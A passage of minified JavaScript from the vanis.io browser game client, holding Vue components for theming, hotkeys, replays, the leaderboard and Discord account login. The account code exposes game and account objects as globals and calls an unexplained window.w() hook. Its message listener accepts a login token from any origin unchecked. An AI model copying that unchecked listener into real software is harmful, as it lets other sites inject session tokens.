                        return "???"
                }
            }

            function z(e) {
                switch (e) {
                    case 0:
                        return "No";
                    case 1:
                        return "Thin";
                    case 2:
                        return "Thick";
                    case 3:
                        return "Thickest";
                    default:
                        return "???"
                }
            }

            function W(e, t) {
                return e ? new Promise((s, i) => {
                    var a = new Image;
                    a.onload = () => {
                        var e = document.createElement("canvas"),
                            i = e.getContext("2d"),
                            n = Math.max(a.width, a.height),
                            o = Math.min(a.width, a.height),
                            r = n === a.width,
                            l = Math.min(n, t) / n,
                            c = (r ? n : o) * l,
                            h = (r ? o : n) * l;
                        e.width = c, e.height = h, i.drawImage(a, 0, 0, c, h), s(e.toDataURL())
                    }, a.onerror = i, a.src = e
                }) : null
            }
            var Z = PIXI.utils.isWebGLSupported() && H.useWebGL,
                j = (s(176), Object(v.a)({
                    components: {
                        colorOption: L,
                        imageOption: R
                    },
                    data: () => ({
                        useWebGL: Z,
                        bgDefault: H.getDefault("backgroundImageUrl"),
                        virusDefault: H.getDefault("virusImageUrl"),
                        mbArrowDefault: "https://i.postimg.cc/6pvLJ2TW/image.png",
                        showNameFontWarning: !1,
                        showMassFontWarning: !1,
                        backgroundColor: H.backgroundColor,
                        borderColor: H.borderColor,
                        foodColor: H.foodColor,
                        ejectedColor: H.ejectedColor,
                        cellNameOutlineColor: H.cellNameOutlineColor,
                        cursorImageUrl: H.cursorImageUrl,
                        backgroundImageUrl: H.backgroundImageUrl,
                        virusImageUrl: H.virusImageUrl,
                        cellMassColor: H.cellMassColor,
                        cellMassOutlineColor: H.cellMassOutlineColor,
                        cellNameFont: H.cellNameFont,
                        cellNameWeight: H.cellNameWeight,
                        cellNameOutline: H.cellNameOutline,
                        cellNameSmoothOutline: H.cellNameSmoothOutline,
                        cellMassFont: H.cellMassFont,
                        cellMassWeight: H.cellMassWeight,
                        cellMassOutline: H.cellMassOutline,
                        cellMassSmoothOutline: H.cellMassSmoothOutline,
                        cellMassTextSize: H.cellMassTextSize,
                        cellLongNameThreshold: H.cellLongNameThreshold,
                        shortMass: H.shortMass,
                        showBackgroundImage: H.showBackgroundImage,
                        backgroundImageRepeat: H.backgroundImageRepeat,
                        backgroundDefaultIfUnequal: H.backgroundDefaultIfUnequal,
                        backgroundImageOpacity: H.backgroundImageOpacity,
                        useFoodColor: H.useFoodColor,
                        mbArrow: H.mbArrow,
                        mbColor: H.mbColor
                    }),
                    computed: {
                        cellNameWeightMeaning() {
                            return Y(this.cellNameWeight)
                        },
                        cellMassWeightMeaning() {
                            return Y(this.cellMassWeight)
                        },
                        cellNameOutlineMeaning() {
                            return z(this.cellNameOutline)
                        },
                        cellMassOutlineMeaning() {
                            return z(this.cellMassOutline)
                        },
                        cellMassTextSizeMeaning() {
                            return function(e) {
                                switch (e) {
                                    case 0:
                                        return "Small";
                                    case 1:
                                        return "Normal";
                                    case 2:
                                        return "Large";
                                    case 3:
                                        return "Largest";
                                    default:
                                        return "???"
                                }
                            }(this.cellMassTextSize)
                        }
                    },
                    methods: {
                        async change(e, t, s) {
                            var i;
                            i = t && t.target ? isNaN(t.target.valueAsNumber) ? t.target.value : t.target.valueAsNumber : t;
                            try {
                                switch (e) {
                                    case "cursorImageUrl":
                                        i = await W(i, 32);
                                        break;
                                    case "backgroundImageUrl":
                                        i !== this.bgDefault && (i = await W(i, 4e3));
                                        break;
                                    case "virusImageUrl":
                                        i !== this.virusDefault && (i = await W(i, 200));
                                        break;
                                    case "mbArrow":
                                        G.dual.reloadArrow(i)
                                }
                            } catch (a) {
                                return void O.alert("This image is too large to even be loaded.")
                            }
                            if (H[e] != i) {
                                var n = this[e];
                                try {
                                    H.set(e, i)
                                } catch (o) {
                                    return H.set(e, n), void O.alert("Saving this setting failed. Perhaps the image is too large?")
                                }
                                switch (this[e] = i, e) {
                                    case "cursorImageUrl":
                                        G.events.$emit("set-cursor-url", i);
                                        break;
                                    case "backgroundColor":
                                        G.renderer.backgroundColor = PIXI.utils.string2hex(i);
                                        break;
                                    case "cellNameOutlineColor":
                                    case "cellNameFont":
                                    case "cellNameWeight":
                                    case "cellNameOutline":
                                    case "cellNameSmoothOutline":
                                        G.settings.compileNameFontStyle();
                                        break;
                                    case "cellMassColor":
                                    case "cellMassOutlineColor":
                                    case "cellMassFont":
                                    case "cellMassWeight":
                                    case "cellMassOutline":
                                    case "cellMassSmoothOutline":
                                    case "cellMassTextSize":
                                        G.settings.compileMassFontStyle();
                                        break;
                                    case "cellLongNameThreshold":
                                        G.scene.resetPlayerLongNames()
                                }
                                if (G.running) switch (e) {
                                    case "borderColor":
                                        G.scene.resetBorder();
                                        break;
                                    case "foodColor":
                                        H.useFoodColor && G.scene.reloadFoodTextures();
                                        break;
                                    case "ejectedColor":
                                        G.scene.reloadEjectedTextures();
                                        break;
                                    case "virusImageUrl":
                                        G.scene.reloadVirusTexture();
                                        break;
                                    case "cellNameOutlineColor":
                                    case "cellNameFont":
                                    case "cellNameWeight":
                                    case "cellNameOutline":
                                    case "cellNameSmoothOutline":
                                        G.scene.resetNameTextStyle();
                                        break;
                                    case "cellMassColor":
                                    case "cellMassOutlineColor":
                                    case "cellMassFont":
                                    case "cellMassWeight":
                                    case "cellMassOutline":
                                    case "cellMassSmoothOutline":
                                    case "cellMassTextSize":
                                        G.scene.resetMassTextStyle(!0);
                                        break;
                                    case "showBackgroundImage":
                                        G.scene.toggleBackgroundImage(i);
                                        break;
                                    case "backgroundImageUrl":
                                    case "backgroundImageRepeat":
                                    case "backgroundDefaultIfUnequal":
                                    case "backgroundImageOpacity":
                                        G.scene.setBackgroundImage();
                                        break;
                                    case "useFoodColor":
                                        G.scene.reloadFoodTextures()
                                }
                            }
                        },
                        confirmReset() {
                            O.confirm("Are you sure you want to reset all setting options?", () => this.reset())
                        },
                        reset() {
                            var e = ["useWebGL", "bgDefault", "virusDefault", "showNameFontWarning", "showMassFontWarning"];
                            for (var t in this.$data) e.includes(t) || this.change(t, H.getDefault(t))
                        },
                        fontWarning(e, t) {
                            switch (e) {
                                case "name":
                                    this.showNameFontWarning = t;
                                    break;
                                case "mass":
                                    this.showMassFontWarning = t
                            }
                        }
                    }
                }, M, [], !1, null, "15c13b66", null));
            j.options.__file = "src/components/theming.vue";
            var J = j.exports,
                K = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("div", {
                        attrs: {
                            id: "hotkey-container"
                        }
                    }, [s("div", {
                        staticClass: "hotkeys"
                    }, e._l(e.availableHotkeys, function(t, i) {
                        return s("div", {
                            key: i,
                            staticClass: "row"
                        }, [s("span", {
                            staticClass: "action"
                        }, [e._v(e._s(i))]), e._v(" "), s("span", {
                            staticClass: "bind",
                            attrs: {
                                tabindex: "0"
                            },
                            on: {
                                mousedown: function(s) {
                                    return e.onMouseDown(s, t)
                                },
                                keydown: function(s) {
                                    return s.preventDefault(), e.onKeyDown(s, t)
                                }
                            }
                        }, [e._v("\n            " + e._s(e.hotkeys[t]) + "\n        ")])])
                    }), 0), e._v(" "), s("div", {
                        staticClass: "footer"
                    }, [s("span", {
                        staticClass: "reset-button2",
                        on: {
                            click: e.onResetClick
                        }
                    }, [s("i", {
                        staticClass: "fa fa-undo"
                    }), e._v(" Reset\n    ")])])])
                };
            K._withStripped = !0;
            var V = s(66),
                X = s(5),
                q = (s(178), Object(v.a)({
                    data: () => ({
                        availableHotkeys: {
                            Multibox: "multibox",
                            "Select player": "selectPlayer",
                            Feed: "feed",
                            "Feed macro": "feedMacro",
                            Split: "split",
                            Doublesplit: "splitx2",
                            Triplesplit: "splitx3",
                            "Quad split": "splitMax",
                            "Split 32": "split32",
                            "Split 64": "split64",
                            "Split 128": "split128",
                            "Split 256": "split256",
                            "Multi trick-split": "multi1",
                            "Multi double-trick": "multi2",
                            "Multi line-trick": "multi3",
                            "Diagonal linesplit": "linesplit",
                            "Freeze mouse": "freezeMouse",
                            "Lock linesplit": "lockLinesplit",
                            "Stop movement": "stopMovement",
                            Respawn: "respawn",
                            "Toggle auto respawn": "toggleAutoRespawn",
                            "Toggle skins": "toggleSkins",
                            "Toggle names": "toggleNames",
                            "Toggle food": "toggleFood",
                            "Toggle mass": "toggleMass",
                            "Toggle chat": "toggleChat",
                            "Toggle chat popup": "toggleChatToast",
                            "Toggle HUD": "toggleHud",
                            "Spectate lock": "spectateLock",
                            "Save replay": "saveReplay",
                            "Zoom level 1": "zoomLevel1",
                            "Zoom level 2": "zoomLevel2",
                            "Zoom level 3": "zoomLevel3",
                            "Zoom level 4": "zoomLevel4",
                            "Zoom level 5": "zoomLevel5"
                        },
                        hotkeys: V.get()
                    }),
                    methods: {
                        onResetClick: function() {
                            X.confirm("Are you sure you want to reset all hotkeys?", () => {
                                this.hotkeys = V.reset()
                            })
                        },
                        onMouseDown: function(e, t) {
                            if (e.target === document.activeElement) {
                                var s = "MOUSE" + e.button;
                                V.set(t, s) && (e.preventDefault(), this.hotkeys[t] = s, e.target.blur())
                            }
                        },
                        onKeyDown: function(e, t) {
                            var s = V.convertKey(e.code);
                            "ESCAPE" !== s && "ENTER" !== s ? ("DELETE" == s && (s = ""), V.set(t, s) && (this.hotkeys[t] = s, e.target.blur())) : e.target.blur()
                        }
                    }
                }, K, [], !1, null, "2dbed53e", null));
            q.options.__file = "src/components/hotkeys.vue";
            var ee = q.exports,
                et = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("div", {
                        staticClass: "container"
                    }, [s("input", {
                        ref: "file",
                        staticStyle: {
                            display: "none"
                        },
                        attrs: {
                            type: "file",
                            accept: ".vanis",
                            multiple: ""
                        },
                        on: {
                            change: function(t) {
                                return e.onFile(t)
                            }
                        }
                    }), e._v(" "), s("div", {
                        staticClass: "replay-list-header"
                    }, [s("span", {
                        staticClass: "replay-list-count"
                    }, [e._v(e._s(e.keysLoadedFirst ? e.replayKeys.length + " replay" + (1 !== e.replayKeys.length ? "s" : "") : "Loading"))]), e._v(" "), e.keysLoadedFirst && !e.keysEmpty ? s("span", {
                        staticClass: "replay-list-page"
                    }, [s("div", {
                        staticClass: "anchor"
                    }, [s("div", {
                        staticClass: "left"
                    }, [s("div", {
                        staticClass: "current"
                    }, [s("div", {
                        staticClass: "phantom"
                    }, [s("i", {
                        staticClass: "fas fa-chevron-left prev",
                        class: {
                            disabled: !e.keysLoaded || 0 === e.pageIndex
                        },
                        on: {
                            click: function() {
                                return e.updateReplayPage(-1)
                            }
                        }
                    }), e._v(" "), s("span", [e._v(e._s(e.pageCount))])]), e._v(" "), e.pageInputShown ? e._e() : s("div", {
                        staticClass: "real",
                        on: {
                            click: function() {
                                return e.togglePageInput(!0)
                            }
                        }
                    }, [s("span", [e._v(e._s(1 + e.pageIndex))])]), e._v(" "), e.pageInputShown ? s("div", {
                        staticClass: "real-input"
                    }, [s("div", {
                        staticClass: "overlay",
                        on: {
                            click: function() {
                                return e.togglePageInput(!1)
                            }
                        }
                    }), e._v(" "), s("i", {
                        staticClass: "fas fa-chevron-left prev",
                        class: {
                            disabled: !e.keysLoaded || 0 === e.pageIndex
                        },
                        on: {
                            click: function() {
                                return e.updateReplayPage(-1)
                            }
                        }
                    }), e._v(" "), s("input", {
                        attrs: {
                            type: "text"
                        },
                        domProps: {
                            value: 1 + e.pageIndex
                        },
                        on: {
                            focus: function(e) {
                                return e.target.select()
                            },
                            change: function(t) {
                                return e.updateReplayPage(t)
                            }
                        }
                    })]) : e._e()])]), e._v("\n            /\n            "), s("div", {
                        staticClass: "right"
                    }, [e._v("\n                " + e._s(e.pageCount) + "\n                    "), s("i", {
                        staticClass: "fas fa-chevron-right next",
                        class: {
                            disabled: !e.keysLoaded || e.pageIndex === e.pageCount - 1
                        },
                        on: {
                            click: function() {
                                return e.updateReplayPage(1)
                            }
                        }
                    })])])]) : e._e(), e._v(" "), s("span", {
                        staticClass: "replay-list-bulk"
                    }, [s("input", {
                        staticClass: "vanis-button",
                        attrs: {
                            type: "button",
                            disabled: !e.keysLoaded,
                            value: "Import"
                        },
                        on: {
                            click: function() {
                                return e.$refs.file.click()
                            }
                        }
                    }), e._v(" "), s("input", {
                        staticClass: "vanis-button",
                        attrs: {
                            type: "button",
                            disabled: !e.keysLoaded || e.keysEmpty,
                            value: "Download all"
                        },
                        on: {
                            click: function() {
                                return e.downloadAllReplays()
                            }
                        }
                    }), e._v(" "), s("input", {
                        staticClass: "vanis-button",
                        attrs: {
                            type: "button",
                            disabled: !e.keysLoaded || e.keysEmpty,
                            value: "Delete all"
                        },
                        on: {
                            click: function() {
                                return e.deleteAllReplays()
                            }
                        }
                    })])]), e._v(" "), s("div", {
                        staticClass: "replay-list"
                    }, [e.keysLoadedFirst && e.keysEmpty ? [s("div", {
                        staticClass: "notification"
                    }, [s("div", [e._v("Press "), s("b", [e._v(e._s(e.messageHotkey))]), e._v(" in game to save last "), s("b", [e._v(e._s(e.messageReplayDuration))]), e._v(" seconds of gameplay.")]), e._v(" "), s("div", {
                        staticStyle: {
                            color: "red",
                            "font-weight": "bold"
                        }
                    }, [e._v("Replays are saved in browser memory!")]), e._v(" "), s("div", [e._v("They get permanently erased if browser data gets cleared.")])])] : e._e(), e._v(" "), e.keysLoadedFirst && !e.keysEmpty ? [s("div", {
                        staticClass: "replay-page"
                    }, e._l(e.pageData, function(e, t) {
                        return s("replay-item", {
                            key: t,
                            attrs: {
                                replay: e
                            }
                        })
                    }), 1)] : e._e()], 2), e._v(" "), e.bulkOperating ? s("div", {
                        staticClass: "overlay bulk-operation-overlay"
                    }, [e._v("\n        Please wait...\n        "), e.bulkOperationStatus ? s("div", {
                        staticClass: "small"
                    }, [e._v(e._s(e.bulkOperationStatus))]) : e._e(), e._v(" "), e.showMultipleFilesWarning ? s("div", {
                        staticClass: "small warning"
                    }, [e._v("Allow page to download multiple files if asked")]) : e._e()]) : e._e()])
                };
            et._withStripped = !0;
            var es = s(116),
                ei = s(89),
                ea = s(180),
                en = s(1),
                eo = s(66),
                er = s(4),
                el = s(5),
                ec = s(8),
                eh = en.replay.database,
                ed = {
                    data: () => ({
                        keysLoadedFirst: !1,
                        keysLoaded: !1,
                        keysLoading: !1,
                        keysEmpty: !1,
                        replayKeys: [],
                        pageInputShown: !1,
                        pageLoadingCancel: null,
                        pageLoaded: !1,
                        pageIndex: 0,
                        pageCount: 0,
                        pageData: [],
                        bulkOperating: !1,
                        bulkOperationStatus: "",
                        showMultipleFilesWarning: !1,
                        messageHotkey: eo.get().saveReplay,
                        messageReplayDuration: er.replayDuration
                    }),
                    components: {
                        replayItem: es.default
                    },
                    methods: {
                        togglePageInput(e) {
                            this.pageInputShown = e
                        },
                        setBulkOp(e, t) {
                            e ? (this.bulkOperating = !0, this.bulkOperationStatus = t || "") : setTimeout(() => {
                                this.bulkOperating = !1, this.bulkOperationStatus = ""
                            }, 1e3)
                        },
                        async onFile(e) {
                            if (!this.bulkOperating) {
                                var t = Array.from(e.target.files);
                                if (t.length) {
                                    e.target && (e.target.value = null);
                                    var s = 0,
                                        i = t.length,
                                        a = t.map(async e => {
                                            var t, a;
                                            await eh.setItem(e.name.replace(/\.vanis$/, ""), await (t = e, new Promise((e, s) => {
                                                var i = new FileReader;
                                                i.onload = t => e(t.target.result), i.onerror = s, i.readAsText(t)
                                            }))), this.setBulkOp(!0, "Importing replays (" + ++s + " / " + i + ")")
                                        });
                                    this.setBulkOp(!0, "Importing replays");
                                    try {
                                        await Promise.all(a)
                                    } catch (n) {
                                        el.alert('Error importing replays: "' + n.message + '"'), this.setBulkOp(!1), this.updateReplayKeys()
                                    }
                                    this.setBulkOp(!1), this.updateReplayKeys()
                                }
                            }
                        },
                        async downloadAllReplays() {
                            if (!this.bulkOperating && this.keysLoaded) {
                                var e = this.replayKeys.length,
                                    t = Math.ceil(this.replayKeys.length / 200),
                                    s = t > 1,
                                    i = ec.getTimestamp();
                                this.showMultipleFilesWarning = s, this.setBulkOp(!0, "Packing replays (0 / " + t + ")");
                                for (var a = 0, n = 0; a < e; a += 200, n++) {
                                    for (var o = new ea, r = a; r < a + 200 && r < e; r++) {
                                        var l = this.replayKeys[r];
                                        o.file(l + ".vanis", await eh.getItem(l))
                                    }
                                    var c = await o.generateAsync({
                                            type: "blob"
                                        }),
                                        h = "replays_" + i;
                                    s && (h += "_" + (n + 1)), h += ".zip", ei.saveAs(c, h), this.setBulkOp(!0, "Packing replays (" + (n + 1) + " / " + t + ")")
                                }
                                this.showMultipleFilesWarning = !1, this.setBulkOp(!1)
                            }
                        },
                        deleteAllReplays() {
                            if (!this.bulkOperating) {
                                var e = this;
                                el.confirm("Are you absolutely sure that you want to delete all replays?", async () => {
                                    this.setBulkOp(!0, "Deleting all replays");
                                    try {
                                        await eh.clear()
                                    } catch (t) {
                                        return void el.alert("Error clearing replays: " + t.message)
                                    }
                                    this.setBulkOp(!1), e.updateReplayKeys()
                                })
                            }
                        },
                        async updateReplayKeys() {
                            if (!this.keysLoading) {
                                this.keysLoaded = !1, this.keysLoading = !0;
                                var e = await eh.keys();
                                e = e.reverse(), this.replayKeys.splice(0, this.replayKeys.length, ...e), this.pageCount = Math.max(Math.ceil(e.length / 12), 1), this.pageIndex = Math.min(this.pageIndex, this.pageCount - 1), this.keysLoaded = !0, this.keysLoadedFirst = !0, this.keysLoading = !1, this.keysEmpty = 0 === e.length, await this.updateReplayPage()
                            }
                        },
                        async updateReplayPage(e) {
                            e && ("number" == typeof e ? this.pageIndex += e : this.pageIndex = parseInt(e.target.value) - 1 || 0), this.pageLoadingCancel && (this.pageLoadingCancel(), this.pageLoadingCancel = null);
                            var t = Math.max(Math.min(this.pageIndex, this.pageCount - 1), 0);
                            this.pageIndex !== t && (this.pageIndex = t), this.pageLoaded = !1;
                            var s = [],
                                i = !1;
                            this.pageLoadingCancel = () => i = !0;
                            for (var a = 12 * this.pageIndex, n = 12 * (1 + this.pageIndex), o = a; o < n && o < this.replayKeys.length && !i; o++) {
                                var r = this.replayKeys[o],
                                    l = {
                                        name: r,
                                        data: await eh.getItem(r)
                                    };
                                l.data.startsWith("REPLAY") ? l.image = l.data.split("|")[2] : l.image = "https://vanis.io/img/replay-placeholder.png", s.push(l)
                            }
                            i || (this.pageData.splice(0, this.pageData.length, ...s), this.pageLoaded = !0)
                        }
                    },
                    created() {
                        this.updateReplayKeys(), en.events.$on("replay-added", this.updateReplayKeys), en.events.$on("replay-removed", this.updateReplayKeys)
                    },
                    beforeDestroy() {
                        en.events.$off("replay-added", this.updateReplayKeys), en.events.$off("replay-removed", this.updateReplayKeys)
                    }
                },
                ep = (s(220), Object(v.a)(ed, et, [], !1, null, "4a996e52", null));
            ep.options.__file = "src/components/replays3.vue";
            var eu = ep.exports,
                eg = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("div", {
                        staticStyle: {
                            padding: "15px"
                        }
                    }, [s("h2", {
                        staticStyle: {
                            margin: "0",
                            "margin-bottom": "14px"
                        }
                    }, [e._v(e._s(e.seasonLeaderboardText))]), e._v(" "), e.errorMessage ? s("div", [e._v("\n    Failed loading season leaderboard data:\n    " + e._s(e.errorMessage) + "\n")]) : e._e(), e._v(" "), e.playerList.length ? s("div", [s("div", {
                        staticClass: "info"
                    }, [e._v("\n        Season XP counts for this season only."), s("br"), e._v("\n            Top few players earn colored names."), s("br"), e._v("\n        Check our "), s("a", {
                        attrs: {
                            href: "https://vanis.io/discord"
                        }
                    }, [e._v("Discord")]), e._v(" for more information."), s("br"), e._v("\n        Season ends in "), s("b", [e._v(e._s(e.seasonEndTime))])]), e._v(" "), e._l(e.playerList, function(t, i) {
                        return s("div", {
                            key: i,
                            staticClass: "player-row",
                            class: {
                                me: !!e.isMe
                            }
                        }, [s("span", {
                            staticClass: "player-nr"
                        }, [e._v(e._s(i + 1) + ".")]), e._v(" "), s("span", {
                            staticClass: "player-name",
                            style: {
                                color: t.perk_color_picked
                            }
                        }, [e._v(e._s(t.name))]), e._v(" "), s("span", {
                            staticClass: "player-xp"
                        }, [e._v(e._s(t.xp) + " XP")])])
                    })], 2) : e._e()])
                };
            eg._withStripped = !0;
            var eA = s(1),
                em = s(228),
                {
                    checkBadWords: ev
                } = s(17),
                ef = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"],
                eC = (s(222), Object(v.a)({
                    data: () => ({
                        playerList: [],
                        errorMessage: "",
                        ownUid: null,
                        date: new Date,
                        nextStartDate: Date.UTC((new Date).getUTCFullYear(), (new Date).getUTCMonth() + 1),
                        seasonEndTime: null,
                        seasonEndTimeInterval: null,
                        selected: "sxp"
                    }),
                    computed: {
                        seasonLeaderboardText() {
                            return ef[this.date.getUTCMonth()] + " " + this.date.getUTCFullYear() + " season"
                        }
                    },
                    methods: {
                        setSeasonEndTime() {
                            this.seasonEndTime = function(e) {
                                if (e < 0) return "now";
                                var t = Math.floor(e / 1e3),
                                    s = t % 60,
                                    i = Math.floor(t / 60),
                                    a = i % 60,
                                    n = Math.floor(i / 60),
                                    o = n % 24,
                                    r = Math.floor(n / 24),
                                    l = [];
                                return r > 0 && l.push(r + " day" + (1 !== r ? "s" : "")), o % 24 > 0 && l.push(o + " hour" + (1 !== o ? "s" : "")), 0 === r && a % 60 > 0 && l.push(a + " minute" + (1 !== a ? "s" : "")), 0 === n && s % 60 > 0 && l.push(s + " second" + (1 !== s ? "s" : "")), l.join(" ")
                            }(this.nextStartDate - Date.now())
                        }
                    },
                    async created() {
                        let e = await em.get("/leaderboard/season_xp/100");
                        if (!e.ok) return;
                        let t = await e.json();
                        this.playerList = t.map(e => ({
                            name: e.perk_name || e.discord_name,
                            perk_color_picked: "#" + (e.perk_color || "ffffff"),
                            badge: e.perk_badges || 0,
                            xp: e.season_xp,
                            isMe: e.me
                        })), eA.events.$on("every-second", this.setSeasonEndTime), this.setSeasonEndTime()
                    },
                    destroyed() {
                        eA.events.$off("every-second", this.setSeasonEndTime)
                    }
                }, eg, [], !1, null, "7179a145", null));
            eC.options.__file = "src/components/meta-leaderboard.vue";
            var ey = eC.exports,
                ew = (s(19), s(1)),
                eI = (s(5), {
                    components: {
                        modal: w.default,
                        settings: Q,
                        theming: J,
                        hotkeys: ee,
                        replays3: eu,
                        metaLeaderboard: ey
                    },
                    data: () => ({
                        activeModal: "",
                        showSettings: !1,
                        showHotkeys: !1,
                        gameState: ew.state,
                        nickname: "string" == typeof localStorage.nickname ? localStorage.nickname : "",
                        teamtag: localStorage.teamtag || "",
                        skinUrl: "string" == typeof localStorage.skinUrl ? localStorage.skinUrl : "https://skins.vanis.io/s/vanis1"
                    }),
                    created: function() {
                        ew.events.$on("skin-click", e => {
                            this.skinUrl = localStorage.skinUrl = document.getElementById("skinDisplay1").src = e
                        })
                    },
                    methods: {
                        openModal: function(e) {
                            this.activeModal = e, this.$emit("modal-open", !0)
                        },
                        closeModal: function() {
                            this.activeModal = "", this.$emit("modal-open", !1)
                        },
                        play() {
                            let {
                                lifeState: e
                            } = this.gameState;
                            if (1 & e) {
                                let {
                                    dual: t
                                } = ew;
                                2 & e ? t.focused ? t.spawn() : ew.actions.join() : t.connected && (t.focused ? t.spawn() : t.switch())
                            } else ew.actions.join();
                            ew.showMenu(!1)
                        },
                        spectate() {
                            let {
                                lifeState: e
                            } = this.gameState;
                            1 & e || (ew.actions.spectate(), ew.showMenu(!1))
                        },
                        onSkinUrlChange() {
                            ew.events.$emit("skin-url-edit", this.skinUrl)
                        },
                        onTeamTagChange() {
                            localStorage.setItem("teamtag", this.teamtag)
                        },
                        onNicknameChange() {
                            localStorage.setItem("nickname", this.nickname)
                        }
                    }
                }),
                e$ = (s(224), Object(v.a)(eI, y, [function() {
                    var e = this.$createElement,
                        t = this._self._c || e;
                    return t("div", {
                        staticStyle: {
                            "text-align": "center",
                            height: "286px"
                        }
                    }, [t("div", {
                        staticStyle: {
                            padding: "4px"
                        }
                    }, [this._v("")])])
                }], !1, null, "1bcde71e", null));
            e$.options.__file = "src/components/player.vue";
            var ek = e$.exports,
                eb = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("div", {
                        staticStyle: {
                            padding: "12px 15px"
                        }
                    }, [e.account ? e._e() : s("div", [s("div", {
                        staticStyle: {
                            "margin-top": "6px",
                            "margin-bottom": "10px"
                        }
                    }, [e._v("Login to your account with Discord to save your in-game progress.")]), e._v(" "), s("div", {
                        staticClass: "discord",
                        on: {
                            click: function() {
                                return e.openDiscordLogin()
                            }
                        }
                    }, [e.loading ? [e.loading ? s("i", {
                        staticClass: "fas fa-sync fa-spin",
                        staticStyle: {
                            "margin-right": "5px"
                        }
                    }) : e._e(), e._v(" Loading\n        ")] : [s("i", {
                        staticClass: "fab fa-discord"
                    }), e._v(" Login with Discord\n            ")]], 2)]), e._v(" "), e.account ? s("div", {
                        staticClass: "account"
                    }, [s("div", {
                        staticStyle: {
                            "margin-bottom": "3px"
                        }
                    }, [s("img", {
                        staticClass: "avatar",
                        attrs: {
                            src: e.avatarUrl
                        }
                    }), e._v(" "), s("div", {
                        staticClass: "player-info"
                    }, [s("div", {
                        style: {
                            color: e.nameColor
                        },
                        attrs: {
                            id: "account-name"
                        }
                    }, [e._v(e._s(e.name))]), e._v(" "), s("div", [e._v("LEVEL " + e._s(e.account.level))]), e._v(" "), s("div", [e._v(e._s(e.account.xp) + " XP")]), e._v(" "), s("div", [e._v(e._s(e.account.season_xp || 0) + " season XP")])])]), e._v(" "), s("div", {
                        staticStyle: {
                            position: "relative"
                        }
                    }, [s("progress-bar", {
                        staticClass: "xp-progress",
                        attrs: {
                            progress: e.progress
                        }
                    }), e._v(" "), s("div", {
                        staticClass: "xp-data"
                    }, [s("div", {
                        staticStyle: {
                            flex: "1",
                            "margin-left": "8px"
                        }
                    }, [e._v(e._s(e.xpAtCurrentLevel))]), e._v(" "), s("div", {
                        staticStyle: {
                            "margin-right": "7px"
                        }
                    }, [e._v(e._s(e.xpAtNextLevel))])])], 1), e._v(" "), s("div", {
                        staticClass: "logout",
                        on: {
                            click: function() {
                                return e.logout()
                            }
                        }
                    }, [s("i", {
                        staticClass: "fas fa-sign-out-alt"
                    }), e._v(" Logout\n    ")])]) : e._e()])
                };
            eb._withStripped = !0;
            var e_ = function() {
                var e = this.$createElement,
                    t = this._self._c || e;
                return t("div", {
                    staticClass: "progress progress-striped"
                }, [t("div", {
                    staticClass: "progress-bar",
                    style: {
                        width: 100 * this.progress + "%"
                    }
                })])
            };
            e_._withStripped = !0;
            var eS = (s(226), Object(v.a)({
                props: ["progress"]
            }, e_, [], !1, null, "4e838c74", null));
            eS.options.__file = "src/components/progressBar.vue";
            var eE = eS.exports,
                ex = s(228),
                eB = s(5),
                e8 = s(1),
                e0 = s(229),
                eQ = (s(230), Object(v.a)({
                    components: {
                        progressBar: eE
                    },
                    data: () => ({
                        accountTime: 0,
                        account: null,
                        progress: 0,
                        xpAtCurrentLevel: 0,
                        xpAtNextLevel: 0,
                        loading: !1,
                        avatarUrl: null,
                        perk_color: null,
                        name: null
                    }),
                    created() {
                        e8.events.$on("xp-update", this.onXpUpdate), this.reloadUserData(), this.listenForToken()
                    },
                    beforeDestroy() {
                        e8.events.$off("xp-update", this.onXpUpdate)
                    },
                    methods: {
                        listenForToken() {
                            window.addEventListener("message", e => {
                                var t = e.data.vanis_token;
                                t && (this.onLoggedIn(t), e.source.postMessage("loggedIn", e.origin))
                            })
                        },
                        reloadUserData() {
                            Date.now() - this.accountTime <= 6e4 || (this.accountTime = Date.now(), ex.vanisToken && this.loadUserData())
                        },
                        async loadUserData() {
                            this.loading = !0;
                            let e = await ex.get("/me");
                            if (!e.ok) {
                                this.loading = !1, console.error("Account:", e.status, e.statusText), 401 === e.status ? ex.clearToken() : 503 === e.status && eB.alert(await e.text());
                                return
                            }
                            let t = await e.json();
                            this.setAccountData(t), this.updateProgress(this.account.xp, this.account.level), window.w(), window.w=()=>{}, this.loading = !1
                        },
                        async logout() {
                            try {
                                await ex.call("DELETE", "/me")
                            } catch (e) {
                                var t = e.response;
                                t && 401 !== t.status && eB.alert("Error: " + e.message)
                            }
                            ex.clearToken(), this.account = null, this.name = null, this.nameColor = null, this.avatarUrl = null, e8.ownUid = null
                        },
                        getAvatarUrl: (e, t) => t ? "https://cdn.discordapp.com/avatars/" + e + "/" + t + ".png" : "https://cdn.discordapp.com/embed/avatars/0.png",
                        setAccountData(e) {
                            window.gameObj = e8, GAME.account = e, this.account = e, this.avatarUrl = this.getAvatarUrl(e.discord_id, e.discord_avatar), this.name = e.perk_name_picked || e.discord_name, this.nameColor = e.perk_color_picked ? "#" + e.perk_color_picked : "#ffffff", e8.ownUid = e.uid, window.account = this;
                        },
                        onXpUpdate(e) {
                            if (this.account) {
                                var t = e0.getLevel(e);
                                this.account.season_xp += e - this.account.xp, this.account.xp = e, this.account.level = t, this.updateProgress(e, t)
                            }
                        },
                        updateProgress(e, t) {
                            this.xpAtCurrentLevel = e0.getXp(t), this.xpAtNextLevel = e0.getXp(t + 1), this.progress = (e - this.xpAtCurrentLevel) / (this.xpAtNextLevel - this.xpAtCurrentLevel)
                        },
                        openDiscordLogin: function() {
                            window.open(ex.url + "/login/discord", "", "width=500, height=750")
                        },
                        onLoggedIn(e) {
                            ex.setToken(e), this.loadUserData()
                        }
                    }
                }, eb, [], !1, null, "661435cd", null));
            eQ.options.__file = "src/components/account.vue";
            var eM = eQ.exports,
                eT = function() {
                    var e = this,
                        t = e.$createElement,
                        s = e._self._c || t;
                    return s("div", {
                        attrs: {
                            id: "skins-container"
                        }
                    }, [s("div", {
                        attrs: {
                            id: "skins"
                        }
                    }, [e._l(e.skins, function(t, i) {
                        return s("span", {
                            key: i,
                            staticClass: "skin-container"
                        }, [s("img", {
                            staticClass: "skin",
                            class: {
